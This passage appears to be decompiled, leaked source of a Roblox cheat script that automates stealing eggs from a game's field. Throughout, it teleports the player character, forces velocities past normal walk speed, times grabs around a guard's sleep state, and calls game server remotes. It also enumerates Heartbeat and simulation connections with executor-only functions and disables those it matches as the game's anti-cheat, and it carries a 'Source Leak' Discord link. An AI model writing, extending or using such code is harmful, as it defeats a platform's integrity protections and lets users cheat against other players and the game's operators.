				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false

					if character:FindFirstChildWhichIsA("Tool") then
						pcall(function()
							humanoid:UnequipTools()
						end)
					end
				end

				local num38 = safeCarry.NewHuman(false)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				local areas = world and world:FindFirstChild("Areas")
				areas = areas and areas:FindFirstChild("SeparationLine")
				local x = areas and areas:IsA("BasePart") and areas.Position.X or 552
				local result19 = stealHome()
				local position2 = str1.Root()
				local str9 = "field"
				local z = position2 and position2.Position.Z or position.Z

				if position2 and result19 and position2.Position.X < x - 2 then
					z = result19.Z

					if (Vector3.new(position2.Position.X, 0, position2.Position.Z) - Vector3.new(result19.X, 0, result19.Z)).Magnitude > 20 then
						str9 = "safe"
					end
				end

				local n21 = math.clamp(z + num38.Lane, -425, -300)
				local n22 = position.Y + 3

				local function func117(num39)
					local flag113 = str1.Root()
					local character2 = localPlayer.Character
					local flag114 = not flag113 or not character2 or math.abs(flag113.Position.Y - num39) < 1

					if not flag114 then
						local snapLimit = safeCarry.SnapLimit
						flag114 = math.abs(flag113.Position.Y - num39) > snapLimit
					end

					if flag114 then
						return false
					end

					pcall(function()
						local rotation = flag113.CFrame.Rotation
						character2:PivotTo(CFrame.new(Vector3.new(flag113.Position.X, num39, flag113.Position.Z)) * rotation)
						flag113.AssemblyLinearVelocity = Vector3.new(flag113.AssemblyLinearVelocity.X, 0, flag113.AssemblyLinearVelocity.Z)
					end)

					return true
				end

				local function func118()
					if safeCarry.RunHeight <= 0.5 then
						return
					end
					func117(n22 + safeCarry.RunHeight)
				end

				if str9 == "field" then
					func118()
				end

				local now = os.clock()
				local now2 = os.clock()
				local now3 = os.clock()
				position2 = position2 and position2.Position or nil

				local function func119(part12, param78, num40, flag115)
					local vector = Vector3.new(param78.X - part12.Position.X, 0, param78.Z - part12.Position.Z)
					local magnitude = vector.Magnitude
					local unit = magnitude > 0.01 and vector.Unit or Vector3.zero

					if safeCarry.RunHeight > 0.5 and str9 == "field" and not flag115 then
						local runSpeed = safeCarry.RunSpeed
						local n23 = math.max(str1.WalkSpeed() * runSpeed * num40, 8)
						local n24 = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local magnitude2 = Vector3.new(position.X - part12.Position.X, 0, position.Z - part12.Position.Z).Magnitude

						if magnitude2 <= 3 then
							if func117(n22) then
								return
							end
						end

						local n25 = magnitude2 <= 3 and n22 or n22 + safeCarry.RunHeight
						if math.abs(n25 - part12.Position.Y) > 2 and func117(n25) then
							return
						end
						local n26 = math.clamp((n25 - part12.Position.Y) / 0.12, -n23 * n24, n23 * n24)
						local n27 = unit * math.min(math.sqrt(math.max(n23 * n23 - n26 * n26, 0)), magnitude / 0.05)

						pcall(function()
							part12.AssemblyLinearVelocity = Vector3.new(n27.X, n26, n27.Z)
						end)

						return
					end

					pcall(function()
						if flag115 or magnitude <= 0.01 then
							if humanoid then
								if safeCarry.RunStyle == "Walk" then
									humanoid:MoveTo(part12.Position)
								end

								humanoid:Move(Vector3.zero, false)
							end

							if safeCarry.RunStyle ~= "Walk" then
								part12.AssemblyLinearVelocity = Vector3.new(0, part12.AssemblyLinearVelocity.Y, 0)
							end
						elseif safeCarry.RunStyle == "Walk" then
							if humanoid then
								humanoid:MoveTo(part12.Position + unit * math.min(magnitude, 30))
							end
						else
							local runSpeed = safeCarry.RunSpeed
							local n23 = unit * math.min(math.max(str1.WalkSpeed() * runSpeed * num40, 8), magnitude / 0.05)
							part12.AssemblyLinearVelocity = Vector3.new(n23.X, part12.AssemblyLinearVelocity.Y, n23.Z)

							if safeCarry.RunAnimate and humanoid then
								humanoid:Move(unit, false)
							end
						end
					end)
				end

				while os.clock() - now < 240 do
					if func61(param77) then
						return false
					end
					local num41 = str1.Root()
					if not num41 then
						return false
					end
					local now4 = os.clock()
					local n23 = math.max(now4 - now2, 0.0041666666666666666)
					local vector = Vector3.new(position.X - num41.Position.X, 0, position.Z - num41.Position.Z)
					if str9 == "field" and vector.Magnitude <= 2.5 and (safeCarry.RunHeight <= 0.5 or num41.Position.Y - n22 < 4) then
						break
					end
					local value86, num42, flag116 = num38.Step(n23, humanoid, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)

					if vector.Magnitude <= 15 then
						flag116 = false
					end

					local vector2 = position

					if str9 == "safe" and result19 then
						if (Vector3.new(result19.X, 0, result19.Z) - Vector3.new(num41.Position.X, 0, num41.Position.Z)).Magnitude <= 6 then
							str9 = "field"
							func118()
						end

						flag50 = "Walking out to the safe zone"
						vector2 = result19
					else
						if not safeCarry.StraightRun and safeCarry.RunHeight <= 0.5 and math.abs(position.X - num41.Position.X) > 25 then
							vector2 = Vector3.new(position.X, position.Y, math.clamp(n21 + num42, -425, -300))
						end

						flag50 = string.format("Running to the egg, %d studs left", math.floor(vector.Magnitude + 0.5))
					end

					local value87, value88 = safeCarry.Avoid(num41.Position, vector2)

					if value88 then
						flag50 = "Walking around " .. tostring(value88)
					end

					func119(num41, value87, value86, flag116)

					if now4 - now3 >= 1.5 then
						if not flag116 and position2 and (num41.Position - position2).Magnitude < 3 and humanoid then
							pcall(function()
								humanoid.Jump = true
							end)
						end

						position2 = num41.Position
						now3 = now4
					end

					RunService.Heartbeat:Wait()
					now2 = now4
				end

				local value89 = str1.Root()

				if value89 then
					func119(value89, value89.Position, 1, true)
				end

				local vector = nil

				if value89 then
					local vector2 = Vector3.new(value89.Position.X - position.X, 0, value89.Position.Z - position.Z)
					local vector3 = vector2.Magnitude > 0.1 and vector2.Unit * 2 or Vector3.zero
					vector = Vector3.new(position.X + vector3.X, value89.Position.Y, position.Z + vector3.Z)
				end

				local connection = RunService.Heartbeat:Connect(function()
					local num43 = str1.Root()
					if not num43 or not vector or str1.Steal.Carrying or str1.AntiGuard.Busy then
						return
					end
					local vector2 = Vector3.new(vector.X - num43.Position.X, 0, vector.Z - num43.Position.Z)

					pcall(function()
						if vector2.Magnitude > 1.5 then
							local rotation = num43.CFrame.Rotation
							num43.CFrame = CFrame.new(vector.X, num43.Position.Y, vector.Z) * rotation
						end

						num43.AssemblyLinearVelocity = Vector3.new(0, math.min(num43.AssemblyLinearVelocity.Y, 0), 0)
					end)
				end)

				local function func120(param79)
					connection:Disconnect()
					return param79
				end

				local obj28 = func103(obj)
				local now4 = os.clock()
				local num44 = safeCarry.React(safeCarry.ReactMin, safeCarry.ReactMax)

				while true do
					if func61(param77) then
						return (func120(false))
					else
						local n23 = os.clock() - now4
						local n24 = safeCarry.RunWait + num44
						local flag117 = not safeCarry.WaitGuard or not obj28 or obj28:GetAttribute("GuardState") == "Sleeping"
						if n23 >= n24 and (flag117 or n23 >= n24 + 15) then
							break
						end
						flag50 = n23 < n24 and string.format("Waiting before the grab, %.1fs", n24 - n23) or "Waiting for the guard to sleep"
						RunService.Heartbeat:Wait()
					end
				end

				flag50 = "Taking the egg"
				local flag118 = func105(obj, param77, 0.8, nil)

				if not flag118 and not func61(param77) then
					flag118 = func89(obj, param77)
				end

				func120()
				if not flag118 then
					return false
				end
				str1.Steal.LastFinishedAt = os.clock()
				return true
			end

			str1.SafeCarry.Pace = function()
				local n21 = tonumber(str1.SafeCarry.RunSpeed) or 1
				return math.max(str1.WalkSpeed() * n21, 16)
			end

			str1.SafeCarry.Plan = function(param80, num45, num46)
				local safeCarry = str1.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				local num47 = str1.WalkSpeed()
				num46 = num46 or safeCarry.Mult or 1

				if safeCarry.SameSpeedBigEggs then
					num46 = math.max(num46, safeCarry.LightMult)
				end

				local n21 = num47 * safeCarry.CarryRatio * num46
				local n22 = n21 * safeCarry.SpeedRatio
				local n23 = safeCarry.ExcessSeconds * n21
				local n24

				if num45 and num45 > n23 then
					n24 = math.min(n22, n21 * num45 / (num45 - n23))
				else
					n24 = n22
				end

				local guards = tbl1.Guards
				local flag119 = type(guards) == "table" and type(guards.Directory) == "table" and guards.Directory[tostring(param80)] or nil
				local n25 = type(flag119) == "table" and tonumber(flag119.WalkSpeed) or 0
				if not safeCarry.BeatGuard then
					return math.max(math.min(n21 * safeCarry.EasyRatio, n24), n21), true, n21, n24, n25
				end
				local n26 = math.max(n25 + safeCarry.GuardMargin, n21 * safeCarry.MinRatio)
				local n27 = math.max(n26, n25 * safeCarry.GuardRatio)

				if n24 < n26 then
					local n28 = n21 * safeCarry.SpeedRatio
					local n29 = safeCarry.StretchSeconds * n21
					local n30

					if num45 and num45 > n29 then
						n30 = math.min(n28, n21 * num45 / (num45 - n29))
					else
						n30 = n28
					end

					local n31 = n25 + math.max(safeCarry.GuardMargin, 1)
					if n31 <= n30 then
						return n31, true, n21, n30, n25
					end
				end

				return math.max(math.min(n27, n24), n21), n26 <= n24, n21, n24, n25
			end

			str1.SafeCarry.Unsafe = function(obj)
				local safeCarry = str1.SafeCarry
				if not safeCarry.Enabled or type(obj) ~= "table" or not obj.Uid or not safeCarry.Blocked[obj.Uid] then
					return nil
				end
				return string.format("the guard caught you with this %s before, skipping it", tostring(obj.Category))
			end

			str1.SafeCarry.Settle = function(param81, param82)
				local safeCarry = str1.SafeCarry
				local character = localPlayer.Character

				if character then
					character:FindFirstChildOfClass("Humanoid")
				end

				math.max(str1.WalkSpeed() * safeCarry.CarryRatio * (safeCarry.Seen[tostring(param82.Category)] or safeCarry.GuessMult) * safeCarry.WaitRate, 1)
				local baseWait = safeCarry.BaseWait
				local obj29 = func103(param82)

				while true do
					if func61(param81) then
						return false
					else
						local n21 = os.clock() - (safeCarry.JumpAt or 0)
						local flag120 = not safeCarry.WaitGuard or not obj29 or obj29:GetAttribute("GuardState") == "Sleeping"
						if n21 >= baseWait and (flag120 or n21 >= baseWait + 15) then
							break
						end

						if n21 < baseWait then
							flag50 = string.format("Letting the jump settle, %.1fs", baseWait - n21)
						else
							flag50 = "Waiting for the guard to sleep"
						end

						RunService.Heartbeat:Wait()
					end
				end

				return true
			end

			str1.MonitorAction = str1.MonitorAction or function(param83)
				local ok, result = pcall(debug.getconstants, param83)
				if not ok or type(result) ~= "table" then
					return false
				end

				for _, value90 in pairs(result) do
					local flag121 = type(value90) == "string"

					if flag121 then
						flag121 = value90 == "Relocate" or value90 == "SetWalkSpeed" or value90 == "BeginRagdoll" or value90 == "EndRagdoll" or value90 == "BeginImpulse"
					end

					if flag121 then
						return true
					end
				end

				return false
			end

			str1.SafeCarry.LineDropHome = function(param84)
				local safeCarry = str1.SafeCarry
				local steal = str1.Steal
				local carryUid = steal.CarryUid
				local result20 = stealHome()
				local flag122 = str1.Root()
				if type(carryUid) ~= "string" or not result20 or not flag122 then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				local x = world and world:IsA("BasePart") and world.Position.X or 552.2
				local y = world and world:IsA("BasePart") and world.Position.Y or 67.67
				local tbl92 = {}

				pcall(function()
					for _, item38 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
						for _, getconnection in ipairs(getconnections(item38)) do
							local ok, result = pcall(function()
								return getconnection.Function
							end)

							if ok and type(result) == "function" then
								local ok2, result2 = pcall(debug.info, result, "s")

								if ok2 and string.find(tostring(result2), "UGI", 1, true) and not str1.MonitorAction(result) then
									local ok3, result3 = pcall(function()
										return getconnection.Enabled
									end)

									if not ok3 or result3 ~= false then
										if pcall(function()
											getconnection:Disable()
										end) then
											table.insert(tbl92, getconnection)
										end
									end
								end
							end
						end
					end
				end)

				local flag123 = false
				local connection = nil

				pcall(function()
					connection = networking["RE/RigSync/Refresh"].OnClientEvent:Connect(function(param85)
						if type(param85) == "table" and param85.Action == "Relocate" then
							flag123 = true
						end
					end)
				end)

				local currentCamera = workspace.CurrentCamera
				local value91 = nil

				local function func121()
					if not safeCarry.LockCamera or value91 or not currentCamera then
						return
					end
					value91 = { Type = currentCamera.CameraType, CFrame = currentCamera.CFrame }

					pcall(function()
						currentCamera.CameraType = Enum.CameraType.Scriptable
						currentCamera.CFrame = value91.CFrame
					end)
				end

				local function func122()
					if not value91 or not currentCamera then
						return
					end
					local value92 = value91
					value91 = nil

					pcall(function()
						currentCamera.CameraType = value92.Type
					end)
				end

				local function func123()
					func122()

					if connection then
						connection:Disconnect()
						connection = nil
					end

					for _, item39 in ipairs(tbl92) do
						pcall(function()
							item39:Enable()
						end)
					end

					table.clear(tbl92)
				end

				local now = os.clock()

				local function func124(callback5)
					local flag124 = str1.Root()
					if not flag124 then
						return false
					end

					pcall(function()
						local rotation = flag124.CFrame.Rotation
						flag124.CFrame = CFrame.new(result20) * rotation
						flag124.AssemblyLinearVelocity = Vector3.zero
						flag124.AssemblyAngularVelocity = Vector3.zero
					end)

					local n21 = 0

					while n21 < 1 and not func61(param84) do
						if callback5 and callback5() then
							return true
						end
						n21 += RunService.Heartbeat:Wait()
					end

					return false
				end

				func74()
				local n21 = math.clamp(flag122.Position.Z, -425, -300)
				local vector = Vector3.new(x + (safeCarry.Hops and safeCarry.HopStop or safeCarry.LineGap), y + 3.35, n21)

				local function func125()
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")

					local ok, result = pcall(function()
						return rfEggWorldAskFieldEggSnapshot:InvokeServer()
					end)

					local records = ok and type(result) == "table" and result.Records or nil

					if type(records) == "table" then
						for _, record in pairs(records) do
							if type(record) == "table" and record.Uid == carryUid then
								return record
							end
						end
					end

					return nil
				end

				local function func126()
					local ok, result = pcall(function()
						return localPlayer:GetNetworkPing()
					end)
					--[=[ 𝗦𝗟 | 𝗦𝗼𝘂𝗿𝗰𝗲 𝗟𝗲𝗮𝗸 ]=] -- discord.gg/x7YbZeezpm

					ok = ok and tonumber(result) or nil
					return ok and math.clamp(ok, 0, 2) or 0.2
				end

				local function func127(flag125)
					local result21 = func126()

					if not flag125 then
						local n22 = 0

						while n22 < safeCarry.DropDelay + result21 and steal.Carrying and not func61(param84) do
							n22 += RunService.Heartbeat:Wait()
						end

						if not steal.Carrying then
							return false
						end
						local eggState = tbl1.EggState

						if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
							pcall(eggState.DropFieldEgg, "PlayerRequest")
						end

						local n23 = 0

						while steal.Carrying and n23 < 1 + result21 * 2 and not func61(param84) do
							n23 += RunService.Heartbeat:Wait()
						end

						if steal.Carrying then
							return true
						end
					end

					local now2 = os.clock()
					local position = nil
					local flag126 = flag123 == true
					local backRunRatio = safeCarry.BackRunRatio
					local backRunMax = safeCarry.BackRunMax
					local n22 = math.clamp(str1.WalkSpeed() * backRunRatio, 1200, backRunMax)
					flag123 = false
					local n23 = 0
					local num48 = now2

					while not steal.Carrying and not func61(param84) do
						local now3 = os.clock()
						local obj30 = workspace:FindFirstChild(carryUid)
						local isModel = obj30 and obj30:IsA("Model")
						local flag127 = false
						local result = nil

						if isModel then
							flag127, result = pcall(obj30.GetPivot, obj30)
						end

						if flag127 and typeof(result) == "CFrame" then
							position = result.Position
						elseif now3 - n23 >= 1 then
							position = func109(carryUid) or position
							n23 = now3
						end

						if now3 - now2 >= 0.5 and now3 - num48 >= 1 then
							local result22 = func125()
							if result22 and result22.State == "Slot" then
								flag50 = "Line Drop: the egg went back to its nest"
								return false
							end

							if not result22 and not position and now3 - now2 > 5 then
								flag50 = "Line Drop: the egg is gone"
								return false
							end
							num48 = now3
						end

						if flag123 then
							flag123 = false
							flag126 = true
						end

						local num49 = str1.Root()

						if num49 and position then
							local vector2 = Vector3.new(position.X - num49.Position.X, 0, position.Z - num49.Position.Z)
							local magnitude = vector2.Magnitude

							if magnitude > 6 then
								if flag126 then
									flag50 = string.format("Line Drop: running back to the egg, %d studs", math.floor(magnitude + 0.5))
									local n24 = vector2.Unit * math.min(math.clamp(magnitude * 4, str1.WalkSpeed(), n22), magnitude / 0.05)

									pcall(function()
										num49.AssemblyLinearVelocity = Vector3.new(n24.X, num49.AssemblyLinearVelocity.Y, n24.Z)
									end)
								else
									flag50 = string.format("Line Drop: teleporting to the egg, %d studs", math.floor(magnitude + 0.5))

									pcall(function()
										num49.CFrame = CFrame.new(position + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
										num49.AssemblyLinearVelocity = Vector3.zero
										num49.AssemblyAngularVelocity = Vector3.zero
									end)
								end
							else
								flag50 = "Line Drop: grabbing the egg back"
							end
						end

						task.spawn(func83, carryUid)
						task.wait(0.05)
					end

					local value93 = str1.Root()

					if value93 then
						pcall(function()
							value93.AssemblyLinearVelocity = Vector3.new(0, value93.AssemblyLinearVelocity.Y, 0)
						end)
					end

					local carrying2 = steal.Carrying and not steal.WrongEgg(carryUid)

					if carrying2 then
						safeCarry.RegrabbedAt = os.clock()
					end

					return carrying2
				end

				local magnitude = Vector3.new(flag122.Position.X - x, 0, flag122.Position.Z - n21).Magnitude
				local max = math.max
				local carryRatio = safeCarry.CarryRatio
				local num50 = max(str1.WalkSpeed() * carryRatio * (tonumber(safeCarry.Mult) or safeCarry.LightMult), 1)
				local directMargin = safeCarry.DirectMargin
				local n22 = math.max(0, (magnitude - safeCarry.DirectBudget) / num50) + directMargin

				if safeCarry.CrossNow then
					n22 = safeCarry.DirectMargin
				end

				local function func128()
					local flag128 = str1.Root()
					if not flag128 then
						return
					end

					pcall(function()
						flag128.CFrame = CFrame.new(vector) * CFrame.Angles(0, 1.5707963267948966, 0)
						flag128.AssemblyLinearVelocity = Vector3.zero
						flag128.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				func121()

				if safeCarry.Hops then
					local value94 = str1.Root()

					if value94 then
						local n23 = value94.Position.Y + safeCarry.HopLift
						local x2 = value94.Position.X
						local hopRatio = safeCarry.HopRatio
						local n24 = math.max(str1.WalkSpeed() * hopRatio, 40)
						local tbl93 = {}
						local func129 = ipairs
						local midDrops = safeCarry.MidDrops or {}

						for _, midDrop in func129(midDrops) do
							table.insert(tbl93, x2 - (x2 - vector.X) * midDrop)
						end

						local n25 = 1

						while true do
							local num51 = x2 - n24 > vector.X
							local flag129 = num51 and not func61(param84)
							local exitTo = nil
							local n26, value95

							while flag129 do
								local flag130, value96, value97, n27, flag131

								if not steal.Carrying then
									flag50 = "Line Drop: the server dropped the egg, grabbing it back"

									if func127(true) then
										local value98 = str1.Root()

										if value98 then
											x2 = value98.Position.X
										end

										if not (x2 - n24 <= vector.X) then
											x2 -= n24
											flag50 = string.format("Line Drop: hopping home, X %d", math.floor(x2))
											flag130 = tbl93[n25] and x2 <= tbl93[n25]

											if flag130 then
												n25 += 1
												flag50 = string.format("Line Drop: dropping and grabbing the egg again (%d/%d)", n25 - 1, #tbl93 + 1)
												value96 = str1.Root()

												if value96 then
													pcall(function()
														value96.CFrame = CFrame.new(x2, vector.Y, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
														value96.AssemblyLinearVelocity = Vector3.zero
														value96.AssemblyAngularVelocity = Vector3.zero
													end)
												end

												if steal.Carrying then
													if func127() then
														value97 = str1.Root()

														if value97 then
															x2 = value97.Position.X
														end

														n27 = 0

														while true do
															flag131 = n27 < safeCarry.MidRest and not func61(param84)
															if flag131 then
																n27 += RunService.Heartbeat:Wait()
																continue
															end
															break
														end

														n26 = 0

														while n26 < safeCarry.HopGap do
															value95 = str1.Root()

															if value95 then
																pcall(function()
																	value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
																	value95.AssemblyLinearVelocity = Vector3.zero
																	value95.AssemblyAngularVelocity = Vector3.zero
																end)
															end

															n26 += RunService.Heartbeat:Wait()
														end

														num51 = x2 - n24 > vector.X
														flag129 = num51 and not func61(param84)
														continue
													end
												else
													n26 = 0

													while n26 < safeCarry.HopGap do
														value95 = str1.Root()

														if value95 then
															pcall(function()
																value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
																value95.AssemblyLinearVelocity = Vector3.zero
																value95.AssemblyAngularVelocity = Vector3.zero
															end)
														end

														n26 += RunService.Heartbeat:Wait()
													end

													num51 = x2 - n24 > vector.X
													flag129 = num51 and not func61(param84)
													continue
												end
											else
												exitTo = 2
												break
											end
										end
									end
								else
									x2 -= n24
									flag50 = string.format("Line Drop: hopping home, X %d", math.floor(x2))
									flag130 = tbl93[n25] and x2 <= tbl93[n25]

									if flag130 then
										n25 += 1
										flag50 = string.format("Line Drop: dropping and grabbing the egg again (%d/%d)", n25 - 1, #tbl93 + 1)
										value96 = str1.Root()

										if value96 then
											pcall(function()
												value96.CFrame = CFrame.new(x2, vector.Y, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
												value96.AssemblyLinearVelocity = Vector3.zero
												value96.AssemblyAngularVelocity = Vector3.zero
											end)
										end

										if steal.Carrying then
											if func127() then
												value97 = str1.Root()

												if value97 then
													x2 = value97.Position.X
												end

												n27 = 0

												while true do
													flag131 = n27 < safeCarry.MidRest and not func61(param84)
													if flag131 then
														n27 += RunService.Heartbeat:Wait()
														continue
													end
													break
												end

												n26 = 0

												while n26 < safeCarry.HopGap do
													value95 = str1.Root()

													if value95 then
														pcall(function()
															value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
															value95.AssemblyLinearVelocity = Vector3.zero
															value95.AssemblyAngularVelocity = Vector3.zero
														end)
													end

													n26 += RunService.Heartbeat:Wait()
												end

												num51 = x2 - n24 > vector.X
												flag129 = num51 and not func61(param84)
												continue
											end
										else
											n26 = 0

											while n26 < safeCarry.HopGap do
												value95 = str1.Root()

												if value95 then
													pcall(function()
														value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
														value95.AssemblyLinearVelocity = Vector3.zero
														value95.AssemblyAngularVelocity = Vector3.zero
													end)
												end

												n26 += RunService.Heartbeat:Wait()
											end

											num51 = x2 - n24 > vector.X
											flag129 = num51 and not func61(param84)
											continue
										end
									else
										exitTo = 1
										break
									end
								end

								break
							end

							if exitTo == 1 then
								n26 = 0

								while n26 < safeCarry.HopGap do
									value95 = str1.Root()

									if value95 then
										pcall(function()
											value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
											value95.AssemblyLinearVelocity = Vector3.zero
											value95.AssemblyAngularVelocity = Vector3.zero
										end)
									end

									n26 += RunService.Heartbeat:Wait()
								end

								continue
							end

							if exitTo == 2 then
								n26 = 0

								while n26 < safeCarry.HopGap do
									value95 = str1.Root()

									if value95 then
										pcall(function()
											value95.CFrame = CFrame.new(x2, n23, n21) * CFrame.Angles(0, 1.5707963267948966, 0)
											value95.AssemblyLinearVelocity = Vector3.zero
											value95.AssemblyAngularVelocity = Vector3.zero
										end)
									end

									n26 += RunService.Heartbeat:Wait()
								end

								continue
							end

							break
						end
					end
				end

				if safeCarry.Hops and not steal.Carrying and not func61(param84) then
					flag50 = "Line Drop: the server dropped the egg, grabbing it back"
					func127(true)
				end

				flag50 = "Line Drop: landing next to the line"
				func128()
				local carrying = safeCarry.Hops and steal.Carrying
				local flag132 = false

				if carrying then
					flag50 = "Line Drop: dropping the egg next to the line"
					local now2 = os.clock()

					for i = 1, 8 do
						if not (not func127() or not steal.Carrying or func61(param84)) then
							local flag133 = str1.Root()

							if flag133 and math.abs(flag133.Position.X - vector.X) <= 30 then
								flag132 = (safeCarry.RegrabbedAt or 0) >= now2
								break
							else
								flag50 = "Line Drop: back to the line with the egg"
								func128()
								continue
							end
						end

						break
					end
				end

				func122()

				if flag132 and not func61(param84) then
					flag50 = "Line Drop: stepping over the line"

					func124(function()
						return safeCarry.LastDelivered >= now or not steal.Carrying
					end)

					local n23 = 0

					while n23 < 2 and safeCarry.LastDelivered < now and steal.Carrying and not func61(param84) do
						n23 += RunService.Heartbeat:Wait()
					end

					if now <= safeCarry.LastDelivered then
						func123()
						return true
					end
				end

				if safeCarry.ShakeTime > 0 then
					local vector2 = Vector3.new(x - safeCarry.ShakeInside, vector.Y, n21)
					local flag134 = false
					local n23 = 0

					while n23 < safeCarry.ShakeTime and steal.Carrying and not func61(param84) do
						flag50 = "Line Drop: shaking at the line"
						flag134 = not flag134
						local value99 = str1.Root()

						if value99 then
							pcall(function()
								value99.CFrame = CFrame.new(flag134 and vector2 or vector) * CFrame.Angles(0, 1.5707963267948966, 0)
								value99.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						n23 += RunService.Heartbeat:Wait()
					end

					func128()
				end

				local flag135 = n22 < safeCarry.LineWait
				local n23 = 0
				local n24 = 1

				while true do
					local carrying3 = steal.Carrying and n23 < safeCarry.LineWait

					if carrying3 then
						carrying3 = not (flag135 and n23 >= n22)
					end

					if carrying3 and not func61(param84) then
						if flag135 then
							flag50 = string.format("Line Drop: stepping over the line in %.1fs", math.max(n22 - n23, 0))
						else
							flag50 = string.format("Line Drop: crossing needs %.1fs, waiting for the guard, %.0fs left", n22, safeCarry.LineWait - n23)
						end

						if flag123 and safeCarry.ReJump and n24 < 40 and not func90() then
							flag123 = false
							n24 += 1
							flag50 = "Line Drop: pulled back, jumping to the line again"
							func128()
						end

						n23 += RunService.Heartbeat:Wait()
						continue
					end

					break
				end

				if steal.Carrying and flag135 and n23 >= n22 and not func61(param84) then
					flag50 = "Line Drop: stepping over the line"

					func124(function()
						return safeCarry.LastDelivered >= now or not steal.Carrying
					end)

					local n25 = 0

					while n25 < 1.5 and safeCarry.LastDelivered < now and steal.Carrying and not func61(param84) do
						n25 += RunService.Heartbeat:Wait()
					end

					if now <= safeCarry.LastDelivered then
						func123()
						return true
					end
				end

				if steal.Carrying then
					func123()
					flag50 = "Line Drop: the guard never came, dropping the egg"
					local eggState = tbl1.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end

					return false
				end

				if safeCarry.GetUp then
					task.spawn(function()
						local n25 = 0

						while n25 < 1.5 do
							local character = localPlayer.Character
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")

							if humanoid then
								pcall(function()
									humanoid.PlatformStand = false
									local state = humanoid:GetState()

									if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
										humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
									end
								end)
							end

							n25 += RunService.Heartbeat:Wait()
						end
					end)
				end

				local n25 = 0

				while not safeCarry.SnapPickup and not safeCarry.GetUp and func90() and n25 < 6 and not func61(param84) do
					flag50 = "Line Drop: egg is down at the line, getting up"
					n25 += RunService.Heartbeat:Wait()
				end

				local n26 = 0

				while not func61(param84) and n26 < 4 do
					n26 += 1
					local num52 = func109(carryUid)

					if not num52 then
						func123()
						flag50 = "Line Drop: the egg is gone"
						return false
					end

					local result23 = func125()

					if result23 and result23.State == "Slot" then
						func123()
						flag50 = "Line Drop: the egg went back to its nest"
						return false
					end

					flag50 = "Line Drop: picking the egg up at the line"
					local n27

					if safeCarry.SnapPickup then
						local value100 = str1.Root()

						if value100 then
							pcall(function()
								value100.CFrame = CFrame.new(num52 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
								value100.AssemblyLinearVelocity = Vector3.zero
							end)
						end

						n27 = 5
					else
						local backRunRatio = safeCarry.BackRunRatio
						local backRunMax = safeCarry.BackRunMax
						local n28 = math.clamp(str1.WalkSpeed() * backRunRatio, 1200, backRunMax)
						local n29 = 0
						local n30 = 0

						while true do
							if not steal.Carrying and n29 < 10 and not func61(param84) then
								local num53 = str1.Root()

								if num53 then
									local vector2 = Vector3.new(num52.X - num53.Position.X, 0, num52.Z - num53.Position.Z)
									local magnitude2 = vector2.Magnitude

									if not (magnitude2 <= 4) then
										local n31 = magnitude2 > 30 and math.clamp(magnitude2 * 4, str1.WalkSpeed(), n28)

										if not n31 then
											local pickupRatio = safeCarry.PickupRatio
											n31 = str1.WalkSpeed() * pickupRatio
										end

										local n32 = vector2.Unit * math.min(n31, magnitude2 / 0.05)

										pcall(function()
											num53.AssemblyLinearVelocity = Vector3.new(n32.X, num53.AssemblyLinearVelocity.Y, n32.Z)
										end)

										if magnitude2 > 30 then
											flag50 = string.format("Line Drop: running back to the egg, %d studs", math.floor(magnitude2 + 0.5))
										end

										if os.clock() - n30 >= 0.1 then
											n30 = os.clock()
											task.spawn(func83, carryUid)
										end

										n29 += RunService.Heartbeat:Wait()
										continue
									end
								end
							end

							break
						end

						local value101 = str1.Root()

						if value101 then
							pcall(function()
								value101.AssemblyLinearVelocity = Vector3.new(0, value101.AssemblyLinearVelocity.Y, 0)
							end)
						end

						n27 = 2.5
					end

					local n28 = 0

					while not steal.Carrying and n28 < n27 and not func61(param84) do
						task.spawn(func83, carryUid)

						if safeCarry.SnapPickup then
							local flag136 = str1.Root()

							if flag136 and Vector3.new(flag136.Position.X - num52.X, 0, flag136.Position.Z - num52.Z).Magnitude > 6 then
								pcall(function()
									flag136.CFrame = CFrame.new(num52 + Vector3.new(0, 3, 0)) * CFrame.Angles(0, 1.5707963267948966, 0)
								end)
							end
						end

						n28 += task.wait(0.1)
					end

					if steal.Carrying and not steal.WrongEgg(carryUid) then
						break
					end
				end

				if not steal.Carrying then
					func123()
					flag50 = "Line Drop: could not pick the egg up again"
					return false
				end

				local flag137 = str1.Root()

				if flag137 and flag137.Position.X - x > safeCarry.FarFromLine then
					func123()
					flag50 = "Line Drop: egg ended up far from the line, carrying it home safely"
					return str1.SafeCarry.Home(param84)
				end

				flag50 = "Line Drop: stepping over the line"

				func124(function()
					return safeCarry.LastDelivered >= now or not steal.Carrying
				end)

